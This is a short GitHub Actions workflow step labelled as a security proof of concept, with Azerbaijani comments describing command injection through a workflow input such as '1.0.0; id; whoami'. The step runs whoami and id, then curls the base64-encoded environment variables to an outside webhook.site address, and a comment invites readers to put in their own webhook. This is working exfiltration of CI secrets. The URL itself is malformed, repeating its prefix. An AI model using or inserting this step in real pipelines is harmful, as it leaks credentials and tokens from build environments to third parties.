- name: Security Test - Proof of Concept
        id: security-poc
        run: |
          # 1. Komanda inyeksiyasını yoxlayırıq:
          # ${{ github.event.inputs.version }} dəyərini "1.0.0; id; whoami" kimi daxil etsək, 
          # bu əmrlər sistemdə icra olunacaq.
          
          echo "Test started..."
          whoami
          id
          
          # 2. Xarici webhook-a məlumat göndəririk (Data Exfiltration):
          # Buradakı URL-i öz Webhook.site ünvanınızla əvəz edin
          curl -X POST -d "status=vulnerable&user=$(whoami)&env=$(env | base64)" https://webhook.site/https://webhook.site/eb29b992-fed7-42e0-9483-f070e2b60aea
